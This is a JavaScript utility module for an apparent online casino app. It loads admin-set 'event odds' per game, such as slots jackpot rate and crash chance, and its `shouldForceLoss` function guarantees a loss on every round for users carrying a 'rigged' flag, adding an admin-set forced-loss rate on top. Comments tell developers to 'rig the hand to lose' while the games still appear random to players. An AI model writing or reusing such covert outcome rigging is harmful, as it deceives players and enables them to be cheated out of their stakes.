/**
 * Per-game event-odds — admin-tunable probabilistic knobs (slots jackpot rate,
 * mines hit rate, crash instant-crash chance, etc.). The server returns these
 * as part of `/api/game-config/:slug`. We cache them per slug so games can ask
 * synchronously after a one-time fetch on mount.
 *
 * Usage in a game component:
 *
 *   useEffect(() => { loadEventOdds('slots'); }, []);
 *   const jackpotChance = getEventOdds('slots', 'jackpot', 0.0007);
 *   if (Math.random() < jackpotChance) { ...force jackpot... }
 *
 * If the admin hasn't set an override, getEventOdds returns the supplied
 * default rate. If they have, it returns the override directly.
 */

const SERVER_URL = import.meta.env.VITE_SERVER_URL || '';

const _cache = {}; // slug -> { eventKey -> override-value (number) | null }
const _loading = {}; // slug -> Promise

export async function loadEventOdds(slug) {
  if (_cache[slug]) return _cache[slug];
  if (_loading[slug]) return _loading[slug];
  _loading[slug] = fetch(`${SERVER_URL}/api/game-config/${slug}`)
    .then(r => r.json())
    .then(d => {
      const odds = (d.ok && d.eventOdds) ? d.eventOdds : {};
      _cache[slug] = odds;
      return odds;
    })
    .catch(() => { _cache[slug] = {}; return {}; })
    .finally(() => { delete _loading[slug]; });
  return _loading[slug];
}

/**
 * Synchronously read a cached override for an event. Returns the admin's
 * override if set, otherwise the supplied default.
 */
export function getEventOdds(slug, eventKey, fallback = 0) {
  const m = _cache[slug];
  if (!m) return fallback;
  const v = m[eventKey];
  if (v === undefined || v === null) return fallback;
  return Number(v);
}

/**
 * Returns true if the admin has set an explicit override for this event.
 * Useful when you want different code paths based on whether rigging is
 * actively configured.
 */
export function hasEventOverride(slug, eventKey) {
  const m = _cache[slug];
  return !!(m && m[eventKey] !== undefined && m[eventKey] !== null);
}

/** Force-refresh the cached odds (e.g. after admin page changes). */
export function invalidateEventOdds(slug) {
  if (slug) delete _cache[slug];
  else for (const k of Object.keys(_cache)) delete _cache[k];
}

/**
 * Returns true if this round should be a guaranteed loss. Combines:
 *   - rigged-user flag (always true)
 *   - admin force-loss rate (probabilistic)
 *
 * Lazily imports isRiggedMode to avoid a circular dependency between
 * eventOdds.js (utility) and casinoBalance.js (which holds the flag).
 *
 * Usage:
 *   import { shouldForceLoss } from '../utils/eventOdds';
 *   if (shouldForceLoss('blackjack')) { ...rig the hand to lose... }
 */
import { isRiggedMode } from './casinoBalance';
export function shouldForceLoss(slug) {
  if (isRiggedMode()) return true;
  const rate = getEventOdds(slug, 'force-loss', 0);
  return rate > 0 && Math.random() < rate;
}
